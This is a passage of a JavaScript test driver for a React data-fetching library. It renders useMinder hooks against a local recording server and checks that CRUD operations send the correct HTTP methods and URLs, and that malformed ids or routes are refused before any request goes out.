/**
 * B1 — the central defect this whole layer exists to catch: `method:
 * options.method` lands in the options object handed to `apiClient.request`
 * with the value `undefined` PRESENT (not absent), and a later
 * `...otherOptions` spread in `ApiClient.ts` overwrites the correct
 * `route.method` with that `undefined`, so axios falls back to its own
 * default — GET — even though `useMinder().mutate()` reports
 * `{"success":true,"method":"POST"}`. No previous test caught this because
 * `tests/useMinder-body-e2e.test.tsx` mocks `axios` and `ApiClient`
 * (FIX_PLAN.md §5) — this driver never mocks either; it drives a real
 * `useMinder()` render through a real HTTP server and reads the REAL method
 * that arrived.
 *
 * Covers, per FIX_PLAN.md §5 matrix: {provider, standalone} x {ESM, CJS} x
 * {useMinder.mutate, operations.create/update/delete, minder()}.
 *
 * Also covers C1/C2/C4/C5 (fix-2.2.0-blockers, WAVE-A — core request path):
 * standalone mutate() reporting success on a real transport failure (a dead
 * port) instead of double-wrapping, DELETE silently dropping its body,
 * mounting a mutating-route hook firing a real request, and
 * operations.update/delete silently degrading into a collection-shaped
 * request when the id can't be placed in the URL.
 */
import net from 'node:net';
import http from 'node:http';

export async function run(ctx) {
  const { scratchDir } = ctx;
  const { requireAbs, importAbs, resolveEntry, requireFromScratch } = ctx.load;
  const { setupDom, renderHeadless, waitFor } = ctx.react;
  const results = [];

  const entry = resolveEntry(scratchDir, '.');
  const mdpCjs = requireAbs(entry.cjs);
  const mdpEsm = await importAbs(entry.esm);

  const recorder = await ctx.startRecordingServer();
  // NOTE: deliberately never torn down (no `teardownDom()`) within this
  // process — react-dom's scheduler (`setImmediate`-based) can leave a
  // trailing tick scheduled past the last `unmount()` we await, and deleting
  // `globalThis.window` while that tick is still in flight crashes with
  // "ReferenceError: window is not defined" (observed empirically). The two
  // drivers that genuinely need `window` ABSENT (h2-node-runtime,
  // config-cors-contract — see their headers) already run in fresh CHILD
  // PROCESSES for exactly this kind of isolation, so leaving jsdom's globals
  // live for the rest of THIS process is safe.
  const { React, ReactDOMClient, dom } = setupDom(scratchDir);

  const lastRecordFor = (urlFragment) => {
    const matches = recorder.records.filter((r) => r.url.includes(urlFragment));
    return matches[matches.length - 1];
  };

  /**
   * Finds the record matching an EXACT method+url, rather than assuming
   * "the last record" is the one a just-awaited call produced. Needed for
   * any case mounted with DEFAULT options (query enabled): `createMutation`/
   * `updateMutation`/`deleteMutation`'s `onSuccess: () =>
   * queryClient.invalidateQueries(...)` triggers a REAL background GET
   * refetch of the (now-enabled) query whenever a mutation succeeds — and on
   * localhost that refetch can complete and land in `recorder.records`
   * WITHIN A COUPLE MILLISECONDS, sometimes before the awaited mutation call
   * even returns control to the test. Matching on the exact method+url the
   * mutation itself should have produced sidesteps that race entirely,
   * regardless of arrival order.
   */
  const recordMatching = (method, url) =>
    recorder.records.find((r) => r.method === method && r.url === url);

  /**
   * Renders `<MinderDataProvider><Probe/></MinderDataProvider>` and returns the
   * mounted useMinder() result + an unmount fn. Waits for `ready(box.current)`
   * (default: the hook result exists) rather than just "mounted once" —
   * `operations` specifically is computed in its own `useMemo` gated on
   * `context?.apiClient && context?.cacheManager` and was empirically observed
   * to still be `undefined` on the very first render captured by the probe.
   */
  async function mountProviderHook(mdp, routeName, config, ready = (r) => r !== undefined) {
    const box = { current: undefined };
    function Probe() {
      box.current = mdp.useMinder(routeName);
      return null;
    }
    const resolvedConfig = mdp.configureMinder(config);
    const { unmount } = renderHeadless(
      ReactDOMClient,
      dom.window.document,
      React.createElement(mdp.MinderDataProvider, { config: resolvedConfig }, React.createElement(Probe)),
    );
    await waitFor(() => ready(box.current), { timeout: 2000 });
    return { box, unmount };
  }

  /**
   * fix-2.2.0-blockers (items 2-5, adversarial re-probe): mounts a bare
   * `useMinderContext()` probe (no `useMinder()` route in between) so a
   * driver can call `apiClient.request(...)` DIRECTLY — exactly the surface
   * the security/method-resolution fixes below must hold on, since
   * `ApiClient.request`'s `options.urlOverride`/`options.method`/
   * `options.params` are reachable by ANY caller with an `apiClient`
   * reference, not only through the hook-level guards `useMinder.helpers.ts`
   * already applies.
   */
  async function mountProviderContext(mdp, config) {
    const box = { current: undefined };
    function Probe() {
      box.current = mdp.useMinderContext();
      return null;
    }
    const resolvedConfig = mdp.configureMinder(config);
    const { unmount } = renderHeadless(
      ReactDOMClient,
      dom.window.document,
      React.createElement(mdp.MinderDataProvider, { config: resolvedConfig }, React.createElement(Probe)),
    );
    await waitFor(() => box.current?.apiClient !== undefined, { timeout: 2000 });
    return { box, unmount };
  }

  /** Same as mountProviderHook but threads hook-level `options` (e.g. `{ params }`) through. */
  async function mountProviderHookWithOptions(mdp, routeName, hookOptions, config, ready = (r) => r !== undefined) {
    const box = { current: undefined };
    function Probe() {
      box.current = mdp.useMinder(routeName, hookOptions);
      return null;
    }
    const resolvedConfig = mdp.configureMinder(config);
    const { unmount } = renderHeadless(
      ReactDOMClient,
      dom.window.document,
      React.createElement(mdp.MinderDataProvider, { config: resolvedConfig }, React.createElement(Probe)),
    );
    await waitFor(() => ready(box.current), { timeout: 2000 });
    return { box, unmount };
  }

  /**
   * Renders `<Probe/>` with NO `<MinderDataProvider>` ancestor (the README's
   * Level 0/1 "provider-less" pattern) after calling the package's own
   * `configureMinder()` to populate the global config `useMinder()` falls
   * back to. `useMinder()` still calls TanStack's `useQueryClient()`
   * internally regardless of provider mode — `<MinderDataProvider>` supplies
   * that context itself, so a provider-less consumer must supply its own
   * `<QueryClientProvider>`, exactly like a real app's Level 0/1 setup would.
   */
  async function mountStandaloneHook(mdp, routeName, config, ready = (r) => r !== undefined) {
    const { QueryClient, QueryClientProvider } = requireFromScratch(scratchDir, '@tanstack/react-query');
    const box = { current: undefined };
    function Probe() {
      box.current = mdp.useMinder(routeName);
      return null;
    }
    mdp.configureMinder(config);
    const queryClient = new QueryClient();
    const { unmount } = renderHeadless(
      ReactDOMClient,
      dom.window.document,
      React.createElement(QueryClientProvider, { client: queryClient }, React.createElement(Probe)),
    );
    await waitFor(() => ready(box.current), { timeout: 2000 });
    return { box, unmount };
  }

  /** Binds an ephemeral TCP port and immediately releases it — guarantees ECONNREFUSED (a real "dead port"). */
  async function getDeadPort() {
    return new Promise((resolve, reject) => {
      const srv = net.createServer();
      srv.on('error', reject);
      srv.listen(0, '127.0.0.1', () => {
        const { port } = srv.address();
        srv.close(() => resolve(port));
      });
    });
  }

  async function mutateCase(id, mdp, method, urlPath) {
    recorder.clear();
    const { box, unmount } = await mountProviderHook(mdp, 'thing', {
      apiUrl: recorder.baseUrl,
      routes: { thing: { method, url: urlPath } },
    });
    try {
      await box.current.mutate({ title: 'hello' });
      const rec = lastRecordFor(urlPath);
      const pass = !!rec && rec.method === method;
      results.push({
        id,
        pass,
        message: pass
          ? `useMinder('thing').mutate() sent ${method} as declared`
          : `useMinder('thing').mutate() on a route declared ${method} sent ${rec ? rec.method : 'NOTHING'} on the wire`,
      });
    } finally {
      unmount();
    }
  }

  async function operationsCase(id, mdp, opName, method, urlPath) {
    recorder.clear();
    // C5: `update`/`delete` routes below carry an ':id' placeholder — since
    // resolveCrudOperationRoute (useMinder.helpers.ts) now REFUSES to resolve
    // an update/delete route with no way to address the id (see C5's own
    // case in this file), a placeholder-less URL would throw here instead of
    // exercising B1's method-on-the-wire assertion. `autoFetch: false` keeps
    // `computeRouteValidation` from flagging the base route's OWN unresolved
    // ':id' as invalid (which would otherwise leave `operations` undefined
    // before we ever call it) — `operations` itself is never gated on
    // isQueryEnabled/autoFetch, so this doesn't affect the assertion below.
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      'thing2',
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { thing2: { method, url: urlPath } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      if (opName === 'create') {
        await box.current.operations.create({ title: 'hello' });
      } else if (opName === 'update') {
        await box.current.operations.update('1', { title: 'hello' });
      } else if (opName === 'delete') {
        await box.current.operations.delete('1');
      }
      const rec = lastRecordFor(urlPath.replace(':id', '1'));
      const pass = !!rec && rec.method === method;
      results.push({
        id,
        pass,
        message: pass
          ? `operations.${opName}() sent ${method} as declared`
          : `operations.${opName}() on a route declared ${method} sent ${rec ? rec.method : 'NOTHING'} on the wire`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * C5 — HOSTILE ID VALUES. Mounts a hook whose route ALREADY carries an
   * explicit non-GET method + an ':id' placeholder (so route-SHAPE
   * validation, assertAddressable, passes cleanly) and calls
   * operations.update/delete with a hostile id VALUE. The fix under test is
   * `assertValidResourceId` (useMinder.helpers.ts) — it must throw BEFORE
   * `resolveCrudOperationRoute`/`ApiClient.request` ever run, so asserting
   * "threw" AND "zero requests reached the wire" together is the only way
   * to prove the id was rejected for its VALUE, not by some unrelated path.
   */
  async function hostileIdCase(resultId, mdp, opName, method, urlTemplate, routeName, hostileId, hostileLabel) {
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      routeName,
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method, url: urlTemplate } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      let threw = false;
      let errMessage = '';
      try {
        if (opName === 'update') {
          await box.current.operations.update(hostileId, { title: 'hello' });
        } else {
          await box.current.operations.delete(hostileId);
        }
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const pass = threw && zeroRequests;
      results.push({
        id: resultId,
        pass,
        message: pass
          ? `operations.${opName}(${hostileLabel}, ...) refused with a directed error ("${errMessage}") and never touched the wire`
          : threw
            ? `operations.${opName}(${hostileLabel}, ...) threw ("${errMessage}") but ${recorder.records.length} request(s) still reached the server: ${JSON.stringify(recorder.records)}`
            : `operations.${opName}(${hostileLabel}, ...) did NOT throw — it silently sent ${recorder.records.length} request(s): ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * C5 — AD-HOC BYPASS. `adhocPath` is a raw/ad-hoc URL (leading '/', never
   * registered in `routes`) with NO ':id' placeholder — exactly the shape
   * the architect drove to a real bypass: `operations.delete` degrading to a
   * bodyless GET with the id silently dropped, and `operations.update`
   * degrading to a body-carrying POST that CREATES a record. Asserts the fix
   * throws before either degraded request reaches the wire.
   */
  async function adhocRefusesCase(resultId, mdp, opName, adhocPath, hostileIdValue) {
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      adhocPath,
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: {} },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      let threw = false;
      let errMessage = '';
      try {
        if (opName === 'update') {
          await box.current.operations.update(hostileIdValue, { t: 1 });
        } else {
          await box.current.operations.delete(hostileIdValue);
        }
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const pass = threw && zeroRequests;
      results.push({
        id: resultId,
        pass,
        message: pass
          ? `operations.${opName}() on ad-hoc route "${adhocPath}" (no ':id' placeholder) refused with a directed error ("${errMessage}") instead of silently degrading to the wrong verb/target`
          : threw
            ? `operations.${opName}() on ad-hoc route "${adhocPath}" threw ("${errMessage}") but ${recorder.records.length} request(s) still reached the wire: ${JSON.stringify(recorder.records)}`
            : `operations.${opName}() on ad-hoc route "${adhocPath}" did NOT throw — it silently sent ${recorder.records.length} request(s): ${JSON.stringify(recorder.records)} (this is the exact C5 ad-hoc degrade bug)`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * C5 — AD-HOC POSITIVE PATH. `adhocPathTemplate` DOES carry an ':id'
   * placeholder (e.g. '/things-x/:id'), so the fix must actually RESOLVE
   * (not just always throw) and send the correct explicit verb with the id
   * substituted into the URL.
   */
  async function adhocResolvesWithIdCase(resultId, mdp, adhocPathTemplate, id, expectedMethod, expectedUrl) {
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      adhocPathTemplate,
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: {} },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await box.current.operations.delete(id);
      const rec = lastRecordFor(expectedUrl);
      const pass = !!rec && rec.method === expectedMethod && rec.url === expectedUrl;
      results.push({
        id: resultId,
        pass,
        message: pass
          ? `operations.delete('${id}') on ad-hoc route "${adhocPathTemplate}" (has an ':id' placeholder) resolved correctly and sent ${expectedMethod} ${expectedUrl}`
          : `operations.delete('${id}') on ad-hoc route "${adhocPathTemplate}" sent ${rec ? `${rec.method} ${rec.url}` : 'NOTHING'}, expected ${expectedMethod} ${expectedUrl}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * N1 (fix-2.2.0-blockers, adversarial re-validation — "OUR OWN C5 GUARD
   * BROKE THE DOCUMENTED GOLDEN PATH", highest priority; RE-RE-VALIDATED —
   * previously this driver still needed `{ autoFetch: false }` to work at
   * all, which was ITSELF the bug: `computeRouteValidation` didn't know
   * about the collection-form resolution `resolveFetchRouteName`/
   * `resolveCrudOperationRoute` apply at dispatch time, so it flagged this
   * exact route shape invalid by default — making `operations` undefined
   * (it's only exposed when the WHOLE hook validates) unless the caller
   * explicitly opted out of auto-fetch. NOW MOUNTED WITH DEFAULT OPTIONS —
   * no `autoFetch: false`, matching the README's Golden Path verbatim): the
   * acceptance test is the Golden Path exactly as documented — ONE
   * registered route (no siblings), DEFAULT options, then
   * create/fetch/update(id)/delete(id) all working against a real server
   * with correct methods, paths, and bodies. The route is registered with
   * an explicit ':id' PATH placeholder (`{ method: 'GET', url:
   * '<urlBase>/:id' }`) — the natural, single-route way to register a whole
   * REST resource family, and the exact shape update()/delete() require.
   * Proves all three halves in one driver: (a) the hook itself is VALID and
   * `operations` is defined with zero extra options; (b) create()/fetch()
   * resolve to the COLLECTION form (':id' stripped, per
   * stripIdPathSegment/resolveFetchRouteName) — and, since default options
   * mean this GET route's own auto-fetch ALSO fires on mount, that the
   * mount-time auto-fetch resolves to the same collection form too, not the
   * literal unresolved ':id' token; (c) update()/delete() keep substituting
   * the id (assertAddressable / C5, completely unmodified).
   */
  async function goldenPathCase(mdp, urlBase) {
    const routeName = 'gpItem';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(
      mdp,
      routeName,
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'GET', url: `${urlBase}/:id` } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      // Default options mean this GET route auto-fetches on mount (the same
      // collection-form resolution operations.fetch() below exercises
      // explicitly). Let that mount-time request land, then clear the
      // recorder so it can't contaminate the LAST-record assertions below —
      // it is itself asserted first, immediately after.
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      const autoFetchRec = recorder.records[recorder.records.length - 1];
      results.push({
        id: 'n1-golden-path-mount-autofetch-resolves-to-collection',
        pass: !!autoFetchRec && autoFetchRec.method === 'GET' && autoFetchRec.url === urlBase,
        message: autoFetchRec
          ? `mounting useMinder('${routeName}') with DEFAULT options (no autoFetch:false) auto-fetched ${autoFetchRec.method} ${autoFetchRec.url}, expected GET ${urlBase} (the collection form) — proves the route validates and auto-fetches by default, the documented behavior`
          : `mounting useMinder('${routeName}') with default options fired NO auto-fetch request at all`,
      });
      recorder.clear();

      // 1. operations.fetch() — must resolve to the COLLECTION form.
      await box.current.operations.fetch();
      const fetchRec = recorder.records[recorder.records.length - 1];
      results.push({
        id: 'n1-golden-path-fetch-resolves-to-collection',
        pass: !!fetchRec && fetchRec.method === 'GET' && fetchRec.url === urlBase,
        message: fetchRec
          ? `operations.fetch() on the SAME single ':id' route ("${urlBase}/:id") sent ${fetchRec.method} ${fetchRec.url}, expected GET ${urlBase} (the collection form)`
          : `operations.fetch() on route "${urlBase}/:id" sent NOTHING`,
      });

      // 2. operations.create() — must ALSO resolve to the COLLECTION form.
      // recordMatching (not "last record"): default options mean the query
      // is enabled, so createMutation's `onSuccess: invalidateQueries` fires
      // a REAL background GET refetch that can land within milliseconds —
      // sometimes before this awaited call even returns — so the true LAST
      // record can be that GET, not create()'s own POST. See recordMatching's
      // own doc comment above.
      recorder.clear();
      await box.current.operations.create({ name: 'hello' });
      const createRec = recordMatching('POST', urlBase);
      results.push({
        id: 'n1-golden-path-create-resolves-to-collection',
        pass: !!createRec,
        message: createRec
          ? `operations.create() on the SAME single ':id' route ("${urlBase}/:id") sent POST ${urlBase} (the collection form, not the literal unresolved ':id')`
          : `operations.create() on route "${urlBase}/:id" did not send POST ${urlBase} — records: ${JSON.stringify(recorder.records)}`,
      });

      // 3. operations.update(id) — must KEEP substituting the id (C5 unmodified).
      recorder.clear();
      await box.current.operations.update('42', { name: 'updated' });
      const expectedUpdateUrl = `${urlBase}/42`;
      const updateRec = recordMatching('PUT', expectedUpdateUrl);
      results.push({
        id: 'n1-golden-path-update-substitutes-id',
        pass: !!updateRec,
        message: updateRec
          ? `operations.update('42', ...) on the SAME single ':id' route sent PUT ${expectedUpdateUrl}`
          : `operations.update('42', ...) on route "${urlBase}/:id" did not send PUT ${expectedUpdateUrl} — records: ${JSON.stringify(recorder.records)}`,
      });

      // 4. operations.delete(id) — must KEEP substituting the id (C5 unmodified).
      recorder.clear();
      await box.current.operations.delete('42');
      const expectedDeleteUrl = `${urlBase}/42`;
      const deleteRec = recordMatching('DELETE', expectedDeleteUrl);
      results.push({
        id: 'n1-golden-path-delete-substitutes-id',
        pass: !!deleteRec,
        message: deleteRec
          ? `operations.delete('42') on the SAME single ':id' route sent DELETE ${expectedDeleteUrl}`
          : `operations.delete('42') on route "${urlBase}/:id" did not send DELETE ${expectedDeleteUrl} — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * Mounts `<MinderDataProvider config={rawConfig}>` with `rawConfig` passed
   * THROUGH UNCHANGED — deliberately never calling `configureMinder()`
   * first. `generateCrudRoutes`'s shorthand-string expansion only ever runs
   * INSIDE `configureMinder()` (src/config/index.ts); this is what actually
   * exercises the N4 scenario — a genuinely hand-built `MinderConfig`, which
   * llms.txt documents `<MinderDataProvider config={...}>` as accepting
   * ("from configureMinder(), or hand-built").
   */
  async function mountProviderHookHandBuilt(mdp, routeName, hookOptions, rawConfig, ready = (r) => r !== undefined) {
    const box = { current: undefined };
    function Probe() {
      box.current = mdp.useMinder(routeName, hookOptions);
      return null;
    }
    const { unmount } = renderHeadless(
      ReactDOMClient,
      dom.window.document,
      React.createElement(mdp.MinderDataProvider, { config: rawConfig }, React.createElement(Probe)),
    );
    await waitFor(() => ready(box.current), { timeout: 2000 });
    return { box, unmount };
  }

  /**
   * N4 (fix-2.2.0-blockers, adversarial re-validation): a HAND-BUILT config
   * (never passed through configureMinder()) using the documented shorthand
   * STRING route form (`{ things: '/things' }` — llms.txt: "a plain string
   * auto-generates ... CRUD routes") previously crashed operations.update/
   * delete with a bare TypeError (reading `.url`/`.method` off a string
   * primitive) instead of a clean CRUD_* error — see
   * resolveCrudOperationRoute's N4 comment (useMinder.helpers.ts). Proves
   * the documented shorthand now actually WORKS on a hand-built config
   * (create/update/delete/fetch all resolve and dispatch correctly),
   * matching generateCrudRoutes' own semantics (base = GET; create = POST
   * base; update/delete = PUT/DELETE `${base}/:id`).
   */
  async function handBuiltShorthandCase(mdp, routeName, urlBase) {
    recorder.clear();
    const rawConfig = { apiBaseUrl: recorder.baseUrl, routes: { [routeName]: urlBase } };
    const { box, unmount } = await mountProviderHookHandBuilt(
      mdp,
      routeName,
      { autoFetch: false },
      rawConfig,
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await box.current.operations.fetch();
      const fetchRec = recorder.records[recorder.records.length - 1];
      results.push({
        id: 'n4-handbuilt-shorthand-fetch-resolves',
        pass: !!fetchRec && fetchRec.method === 'GET' && fetchRec.url === urlBase,
        message: fetchRec
          ? `operations.fetch() on a HAND-BUILT config's shorthand string route ("${urlBase}") sent ${fetchRec.method} ${fetchRec.url}, expected GET ${urlBase}`
          : `operations.fetch() sent NOTHING (or crashed) on a hand-built shorthand-string route`,
      });

      recorder.clear();
      await box.current.operations.create({ name: 'hello' });
      const createRec = recorder.records[recorder.records.length - 1];
      results.push({
        id: 'n4-handbuilt-shorthand-create-resolves',
        pass: !!createRec && createRec.method === 'POST' && createRec.url === urlBase,
        message: createRec
          ? `operations.create() on a HAND-BUILT config's shorthand string route sent ${createRec.method} ${createRec.url}, expected POST ${urlBase}`
          : `operations.create() sent NOTHING (or crashed) on a hand-built shorthand-string route`,
      });

      recorder.clear();
      await box.current.operations.update('9', { name: 'updated' });
      const updateRec = recorder.records[recorder.records.length - 1];
      const expectedUpdateUrl = `${urlBase}/9`;
      results.push({
        id: 'n4-handbuilt-shorthand-update-resolves',
        pass: !!updateRec && updateRec.method === 'PUT' && updateRec.url === expectedUpdateUrl,
        message: updateRec
          ? `operations.update('9', ...) on a HAND-BUILT config's shorthand string route sent ${updateRec.method} ${updateRec.url}, expected PUT ${expectedUpdateUrl}`
          : `operations.update('9', ...) sent NOTHING (or crashed with a raw TypeError) on a hand-built shorthand-string route`,
      });

      recorder.clear();
      await box.current.operations.delete('9');
      const deleteRec = recorder.records[recorder.records.length - 1];
      const expectedDeleteUrl = `${urlBase}/9`;
      results.push({
        id: 'n4-handbuilt-shorthand-delete-resolves',
        pass: !!deleteRec && deleteRec.method === 'DELETE' && deleteRec.url === expectedDeleteUrl,
        message: deleteRec
          ? `operations.delete('9') on a HAND-BUILT config's shorthand string route sent ${deleteRec.method} ${deleteRec.url}, expected DELETE ${expectedDeleteUrl}`
          : `operations.delete('9') sent NOTHING (or crashed with a raw TypeError) on a hand-built shorthand-string route`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * HEADLINE ACCEPTANCE TEST (FIX-A, CRUD RESOLUTION): the documented Golden
   * Path snippet, VERBATIM, with DEFAULT options (no `autoFetch: false`
   * workaround), against a single registered route using the documented
   * shorthand-STRING form (`routes: { users: '<urlBase>' }` —
   * `generateCrudRoutes` auto-expands it into the base GET route plus
   * `create${Cap}`/`update${Cap}`/`delete${Cap}` siblings):
   *   const { operations } = useMinder('users');
   *   operations.create(...); operations.update(id, ...); operations.delete(id);
   * All four operations (including the base route's own auto-fetch on
   * mount) must land on the wire with the correct method/path.
   */
  async function readmeGoldenPathVerbatimCase(mdp, urlBase) {
    const routeName = 'rmUsers';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(
      mdp,
      routeName,
      { apiUrl: recorder.baseUrl, routes: { [routeName]: urlBase } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      const autoFetchRec = recorder.records[recorder.records.length - 1];
      results.push({
        id: 'n1-readme-golden-path-verbatim-autofetch',
        pass: !!autoFetchRec && autoFetchRec.method === 'GET' && autoFetchRec.url === urlBase,
        message: autoFetchRec
          ? `README Golden Path: mounting useMinder('${routeName}') with DEFAULT options auto-fetched ${autoFetchRec.method} ${autoFetchRec.url}, expected GET ${urlBase}`
          : `README Golden Path: mounting with default options fired no auto-fetch request`,
      });
      recorder.clear();

      // recordMatching (not "last record"): default options mean the query
      // is enabled, so each mutation's `onSuccess: invalidateQueries` fires
      // a real background GET refetch that can land within milliseconds —
      // see recordMatching's own doc comment above.
      await box.current.operations.create({ name: 'Ada' });
      const createRec = recordMatching('POST', urlBase);
      results.push({
        id: 'n1-readme-golden-path-verbatim-create',
        pass: !!createRec,
        message: createRec
          ? `README Golden Path: operations.create() sent POST ${urlBase}`
          : `README Golden Path: operations.create() did not send POST ${urlBase} — records: ${JSON.stringify(recorder.records)}`,
      });

      recorder.clear();
      await box.current.operations.update('7', { name: 'Ada L.' });
      const expectedUpdateUrl = `${urlBase}/7`;
      const updateRec = recordMatching('PUT', expectedUpdateUrl);
      results.push({
        id: 'n1-readme-golden-path-verbatim-update',
        pass: !!updateRec,
        message: updateRec
          ? `README Golden Path: operations.update('7', ...) sent PUT ${expectedUpdateUrl}`
          : `README Golden Path: operations.update('7', ...) did not send PUT ${expectedUpdateUrl} — records: ${JSON.stringify(recorder.records)}`,
      });

      recorder.clear();
      await box.current.operations.delete('7');
      const expectedDeleteUrl = `${urlBase}/7`;
      const deleteRec = recordMatching('DELETE', expectedDeleteUrl);
      results.push({
        id: 'n1-readme-golden-path-verbatim-delete',
        pass: !!deleteRec,
        message: deleteRec
          ? `README Golden Path: operations.delete('7') sent DELETE ${expectedDeleteUrl}`
          : `README Golden Path: operations.delete('7') did not send DELETE ${expectedDeleteUrl} — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * CRITICAL — case-sensitive method comparison. Registers the SAME
   * single-':id'-route Golden Path shape as `goldenPathCase`, but with the
   * method written `'get'` (lowercase) instead of the canonical `'GET'`
   * constant — the exact hostile/malformed-config shape the architect named
   * ("a route whose method is written in any other case ... is treated as
   * non-GET, so operations.update/delete dispatch the WRONG HTTP VERB").
   * Before the fix, `baseRoute.method !== HttpMethod.GET` evaluated true for
   * `'get'`, so this route was (wrongly) treated as an "already-explicit
   * non-GET route" — `operations.create/update/delete` dispatched THAT
   * route's own declared (lowercase) verb unchanged instead of being
   * redirected to POST/PUT/DELETE. All four operations must still resolve
   * to the CORRECT verb.
   */
  async function lowercaseMethodCase(mdp, urlBase) {
    const routeName = 'lcItem';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(
      mdp,
      routeName,
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'get', url: `${urlBase}/:id` } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      recorder.clear();

      // recordMatching, not "last record" — see its own doc comment (the
      // default-options query's invalidateQueries-triggered background
      // refetch can race ahead of the mutation's own request).
      await box.current.operations.create({ name: 'hello' });
      const createRec = recordMatching('POST', urlBase);
      results.push({
        id: 'critical-lowercase-method-create-sends-post',
        pass: !!createRec,
        message: createRec
          ? `route declared method:'get' (lowercase) — operations.create() sent POST ${urlBase}`
          : `operations.create() did not send POST ${urlBase} on a method:'get' route — records: ${JSON.stringify(recorder.records)}`,
      });

      recorder.clear();
      await box.current.operations.update('5', { name: 'updated' });
      const expectedUpdateUrl = `${urlBase}/5`;
      const updateRec = recordMatching('PUT', expectedUpdateUrl);
      results.push({
        id: 'critical-lowercase-method-update-sends-put',
        pass: !!updateRec,
        message: updateRec
          ? `route declared method:'get' (lowercase) — operations.update('5', ...) sent PUT ${expectedUpdateUrl}`
          : `operations.update('5', ...) did not send PUT ${expectedUpdateUrl} on a method:'get' route — records: ${JSON.stringify(recorder.records)}`,
      });

      recorder.clear();
      await box.current.operations.delete('5');
      const expectedDeleteUrl = `${urlBase}/5`;
      const deleteRec = recordMatching('DELETE', expectedDeleteUrl);
      results.push({
        id: 'critical-lowercase-method-delete-sends-delete',
        pass: !!deleteRec,
        message: deleteRec
          ? `route declared method:'get' (lowercase) — operations.delete('5') sent DELETE ${expectedDeleteUrl}`
          : `operations.delete('5') did not send DELETE ${expectedDeleteUrl} on a method:'get' route — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * CRITICAL continued — case-sensitivity on the SIBLING-redirect branch
   * specifically (a DIFFERENT guard than lowercaseMethodCase's no-sibling
   * fallback: `resolveCrudOperationRoute`'s `normalizeMethod(baseRoute.method)
   * !== HttpMethod.GET` check at the TOP of the function, which gates
   * whether sibling lookup happens at all). A hand-authored base route
   * declared `method: 'GeT'` (mixed case) WITH a registered `create${Cap}`
   * sibling must still be redirected to that sibling instead of being
   * treated as "already non-GET" and dispatched unchanged.
   */
  async function lowercaseMethodSiblingCase(mdp, urlBase) {
    const routeName = 'lcSib';
    recorder.clear();
    const { box, unmount } = await mountProviderHook(
      mdp,
      routeName,
      {
        apiUrl: recorder.baseUrl,
        routes: {
          [routeName]: { method: 'GeT', url: urlBase },
          createLcSib: { method: 'POST', url: urlBase },
        },
      },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      recorder.clear();

      await box.current.operations.create({ name: 'hello' });
      const createRec = recordMatching('POST', urlBase);
      results.push({
        id: 'critical-lowercase-method-sibling-redirect-sends-post',
        pass: !!createRec,
        message: createRec
          ? `base route declared method:'GeT' (mixed case) with a registered POST sibling — operations.create() sent POST ${urlBase} (via sibling redirect)`
          : `operations.create() did not send POST ${urlBase} on a mixed-case base route with a POST sibling — records: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * CRITICAL continued — case-sensitivity DEFENSE IN DEPTH, isolated from the
   * config-boundary normalization. `src/config/index.ts`'s `generateCrudRoutes`
   * ALSO normalizes an explicit `ApiRoute.method`'s case, but ONLY for config
   * that passes through `configureMinder()` — a genuinely HAND-BUILT config
   * (never calling `configureMinder()`; see N4's own precedent — llms.txt
   * documents `<MinderDataProvider config={...}>` as accepting one) bypasses
   * that boundary entirely, so this scenario can ONLY be saved by
   * `normalizeMethod` at the COMPARISON site in useMinder.helpers.ts. Proves
   * the comparison-site defense holds on its own, independent of the
   * config-boundary one.
   */
  async function lowercaseMethodHandBuiltCase(mdp, urlBase) {
    const routeName = 'lcHandBuilt';
    recorder.clear();
    const rawConfig = {
      apiBaseUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'get', url: `${urlBase}/:id` } },
    };
    const { box, unmount } = await mountProviderHookHandBuilt(
      mdp,
      routeName,
      {},
      rawConfig,
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      recorder.clear();

      await box.current.operations.create({ name: 'hello' });
      const createRec = recordMatching('POST', urlBase);
      results.push({
        id: 'critical-lowercase-method-handbuilt-config-create-sends-post',
        pass: !!createRec,
